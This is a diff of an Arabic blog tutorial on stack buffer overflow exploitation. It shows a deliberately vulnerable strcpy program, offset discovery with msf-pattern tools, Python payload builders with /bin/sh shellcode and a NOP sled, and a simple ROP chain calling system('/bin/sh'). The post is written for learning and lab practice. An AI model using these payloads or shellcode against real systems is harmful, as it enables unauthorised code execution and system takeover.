@@ -1,154 +1,123 @@
 ---
 layout: blog
-title: "Buffer Overflow من الأساس للاستغلال: رحلة عميقة في أخطر ثغرات الذاكرة"
-date: 2026-03-29T04:18:38Z
+title: "Buffer Overflow من الأساس للاستغلال: رحلة عملية في أقدم ثغرة أمنية لا تزال حاضرة"
+date: 2026-03-29T06:11:16Z
 category: "تقنية"
-excerpt: "ثغرات Buffer Overflow تمثل حجر الأساس في عالم Offensive Security. رغم أنها من أقدم أنواع الثغرات، إلا أنها لا تزال تظهر في أنظمة حديثة وتشكل خطرًا حقيقيًا. في هذه المقالة نستعرض الآلية الداخلية للثغرة وكيفية استغلالها عمليًا."
+excerpt: "ثغرة Buffer Overflow ليست مجرد خطأ برمجي، بل بوابة كاملة لتنفيذ أكواد خبيثة والسيطرة على الأنظمة. رغم مرور عقود على اكتشافها، لا تزال حاضرة في الأنظمة الحديثة. سنفكك هذه الثغرة من جذورها، ونفهم آليتها التقنية، ونصل للاستغلال العملي."
 read_time: 8
-tags: ["Buffer Overflow", "Binary Exploitation", "Memory Corruption", "Shellcode", "Offensive Security"]
+tags: ["Buffer Overflow", "Binary Exploitation", "Offensive Security", "Memory Corruption", "Exploit Development"]
 slug: "buffer-overflow-guide"
 ---
 
-## فهم البنية الأساسية للذاكرة
+## فهم الـ Stack والذاكرة
 
-قبل الحديث عن Buffer Overflow، علينا فهم كيف تنظم البرامج الذاكرة. عند تشغيل أي برنامج، يخصص نظام التشغيل له مساحة في الذاكرة مقسمة إلى عدة أقسام:
+لفهم Buffer Overflow، علينا البدء من الذاكرة. كل برنامج يعمل لديه Stack: منطقة ذاكرة تخزن المتغيرات المحلية وعناوين العودة للدوال. عندما تُستدعى دالة، يُحفظ عنوان العودة (Return Address) على الـ Stack لتعرف CPU أين تعود بعد انتهاء الدالة.
 
-- **Stack**: يحتوي على المتغيرات المحلية وعناوين Return addresses
-- **Heap**: للذاكرة الديناميكية المخصصة أثناء التشغيل
-- **Data/BSS**: للمتغيرات الثابتة والعامة
-- **Text**: يحتوي على الكود القابل للتنفيذ
-
-الـ Stack هو المنطقة الأكثر أهمية في سياق Buffer Overflow. ينمو من عناوين الذاكرة العليا نحو السفلى، ويحتوي على Stack frames لكل دالة يتم استدعاؤها.
-
-## كيف تحدث الثغرة؟
-
-Buffer Overflow يحدث عندما يكتب البرنامج بيانات تتجاوز حجم المساحة المخصصة (Buffer). لنأخذ مثالًا بسيطًا:
+الـ Buffer هو مساحة محجوزة لتخزين بيانات. عندما نكتب بيانات أكثر من سعة الـ Buffer دون فحص، نتجاوز حدوده ونكتب فوق مناطق أخرى في الذاكرة. هنا تولد الثغرة.
 
 ```c
 #include <string.h>
-#include <stdio.h>
 
 void vulnerable_function(char *input) {
     char buffer[64];
-    strcpy(buffer, input);  // No bounds checking!
-    printf("Data: %s\n", buffer);
+    strcpy(buffer, input);  // لا يوجد فحص للحجم
 }
 
 int main(int argc, char **argv) {
-    if(argc > 1) {
-        vulnerable_function(argv[1]);
-    }
+    vulnerable_function(argv[1]);
     return 0;
 }
 ```
 
-المشكلة هنا أن `strcpy` لا تفحص حجم البيانات المنسوخة. إذا كان حجم `input` أكبر من 64 بايت، سيتم الكتابة فوق البيانات المجاورة في الـ Stack، بما فيها الـ Return address.
+الكود أعلاه يستقبل مدخلات المستخدم دون فحص. إذا أدخلنا أكثر من 64 بايت، سنتجاوز الـ buffer ونكتب فوق return address.
 
-## تشريح Stack Frame
+## تشريح الاستغلال
 
-عند استدعاء دالة، يحدث التالي على الـ Stack:
+الاستغلال يعتمد على ثلاث خطوات:
 
-```
-Low Memory
-+------------------+
-|  Local Variables |
-+------------------+
-|  Saved EBP       |  <- Base Pointer
-+------------------+
-|  Return Address  |  <- Instruction Pointer
-+------------------+
-|  Function Args   |
-+------------------+
-High Memory
-```
+**1. التحكم في EIP/RIP**
+الهدف الأول هو الكتابة فوق return address لتوجيه التنفيذ لعنوان نختاره. نحتاج معرفة المسافة (offset) بين بداية الـ buffer وموقع return address.
 
-الـ Return address هو الهدف الأساسي. إذا تمكنا من الكتابة فوقه، نستطيع التحكم في تدفق البرنامج وتوجيهه لتنفيذ الكود الخاص بنا.
-
-## من الاكتشاف للاستغلال
-
-عملية الاستغلال تمر بعدة مراحل:
-
-**1. اكتشاف الثغرة:**
-نبدأ بإرسال بيانات كبيرة ومراقبة سلوك البرنامج. استخدام أدوات مثل GDB أو Immunity Debugger ضروري:
+**2. إيجاد الـ Offset**
+نستخدم pattern عشوائي فريد لتحديد المسافة بدقة:
 
 ```bash
-# إنشاء Pattern لتحديد Offset
-gdb ./vulnerable_program
-run $(python -c 'print "A"*100')
+# استخدام msf-pattern_create
+msf-pattern_create -l 200
+# ننفذ البرنامج مع الـ pattern
+gdb ./vulnerable
+run $(msf-pattern_create -l 200)
+# نأخذ قيمة EIP/RIP المكتوبة
+msf-pattern_offset -q 0x35624134
+# النتيجة: Exact match at offset 76
 ```
 
-إذا حصلنا على Segmentation fault، نعرف أن الثغرة موجودة.
+**3. صياغة الـ Exploit**
+بعد معرفة الـ offset، نبني payload:
+- 76 بايت (Padding)
+- 4/8 بايت (Return Address الجديد)
+- Shellcode أو عنوان دالة خطرة
 
-**2. تحديد الـ Offset:**
-نحتاج لمعرفة عدد البايتات بالضبط قبل الوصول للـ Return address:
+## بناء Payload عملي
 
-```python
-from pwn import *
-
-# إنشاء pattern فريد
-pattern = cyclic(200)
-with open('payload.txt', 'wb') as f:
-    f.write(pattern)
-```
-
-بعد التشغيل والتعطل، نفحص قيمة EIP (Instruction Pointer) في الـ debugger لنحدد الـ offset الدقيق.
-
-**3. بناء الـ Exploit:**
-الآن نبني الـ payload الكامل:
+لنفترض أننا نريد تنفيذ shellcode يفتح shell. أولاً نحتاج عنواناً ثابتاً في الذاكرة:
 
 ```python
-from struct import pack
+import struct
 
-# افترض أن الـ offset هو 76 بايت
-offset = 76
-
-# عنوان الـ shellcode في الذاكرة
-ret_address = pack('<I', 0xbffff650)
-
-# Shellcode لفتح shell
+# Shellcode لفتح /bin/sh (x86-64)
 shellcode = (
-    b"\x31\xc0\x50\x68\x2f\x2f\x73\x68"
-    b"\x68\x2f\x62\x69\x6e\x89\xe3\x50"
-    b"\x53\x89\xe1\xb0\x0b\xcd\x80"
+    b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e"
+    b"\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58"
+    b"\x99\x0f\x05"
 )
 
-# بناء الـ payload النهائي
-payload = b"A" * (offset - len(shellcode))
-payload += shellcode
+offset = 76
+ret_address = struct.pack("<Q", 0x7fffffffe400)  # عنوان الـ Stack
+
+payload = b"A" * offset
 payload += ret_address
+payload += b"\x90" * 16  # NOP sled
+payload += shellcode
 
-print(payload)
+with open("exploit.bin", "wb") as f:
+    f.write(payload)
 ```
 
-## التحديات والحماية الحديثة
+الـ NOP sled (\x90) يعطينا مساحة خطأ. إذا لم نصب العنوان بدقة، سننزلق على الـ NOPs حتى نصل للـ shellcode.
 
-اليوم، استغلال Buffer Overflow أصبح أصعب بكثير بسبب آليات الحماية:
+## الحمايات الحديثة والتجاوز
 
-**DEP/NX (Data Execution Prevention):**
-يمنع تنفيذ الكود من الـ Stack أو الـ Heap. للتغلب عليه، نستخدم تقنيات مثل ROP (Return-Oriented Programming).
+الأنظمة الحديثة ليست ساذجة. تطبق عدة حمايات:
 
-**ASLR (Address Space Layout Randomization):**
-يعشّي عناوين الذاكرة عند كل تشغيل، مما يجعل التوقع صعبًا. نحتاج لـ Information leak للتغلب عليه.
+**DEP/NX**: يمنع تنفيذ كود من الـ Stack. الحل: ROP (Return Oriented Programming) - نستخدم قطع كود موجودة (gadgets) لبناء سلسلة تنفيذية.
 
-**Stack Canaries:**
-قيم عشوائية توضع قبل الـ Return address. إذا تغيرت، يتوقف البرنامج. يمكن تجاوزها بتسريب قيمة الـ Canary أولاً.
+**ASLR**: يعشوئ عناوين الذاكرة. الحل: تسريب عنوان من الذاكرة أولاً، أو استخدام ثغرة information disclosure.
 
-```c
-// مثال على Canary في GCC
-void function() {
-    // Stack canary يُدرج تلقائياً هنا
-    char buffer[64];
-    // Code
-    // فحص الـ Canary قبل الـ Return
-}
+**Stack Canaries**: قيمة عشوائية قبل return address. إذا تغيرت، البرنامج ينهي. الحل: تسريب قيمة الـ canary أو تجاوزه بدقة.
+
+مثال ROP بسيط:
+
+```python
+# بدلاً من shellcode، نستدعي system("/bin/sh")
+pop_rdi = 0x400686  # gadget: pop rdi; ret
+bin_sh = 0x400770   # عنوان string "/bin/sh"
+system_addr = 0x400560
+
+payload = b"A" * offset
+payload += struct.pack("<Q", pop_rdi)
+payload += struct.pack("<Q", bin_sh)
+payload += struct.pack("<Q", system_addr)
 ```
 
-## الخلاصة والممارسات الآمنة
+## الخلاصة والممارسة
 
-فهم Buffer Overflow ليس فقط لاستغلاله، بل لحماية أنظمتك. كمطور، استخدم دوماً:
+Buffer Overflow ليس مفهوماً نظرياً، بل مهارة تُصقل بالممارسة. ابدأ بمعامل بسيطة:
+- جرب Protostar على exploit.education
+- استخدم pwntools للأتمتة
+- فهم assembly أساسي ضروري
+- اقرأ كود البرامج المفتوحة للثغرات المكتشفة
 
-- الدوال الآمنة مثل `strncpy` و `fgets` بدلاً من `strcpy` و `gets`
-- تفعيل جميع آليات الحماية أثناء الـ Compilation
-- مراجعة الكود المتعلق بمعالجة المدخلات بعناية
+كل CVE استغل buffer overflow يحمل درساً. من Morris Worm سنة 1988 إلى ثغرات حديثة في routers وIoT devices، المبدأ واحد لكن التقنيات تتطور.
 
-كـ Penetration tester، هذه المعرفة تفتح لك باب فهم ثغرات أعقد وتقنيات استغلال متقدمة مثل Heap exploitation و Format string vulnerabilities.
+المهاجم المتقن لا يكتفي بنسخ exploits، بل يفهم كل بايت في الـ payload ولماذا موضوع هناك. هذا الفهم هو الفارق بين script kiddie ومختبر اختراق حقيقي.
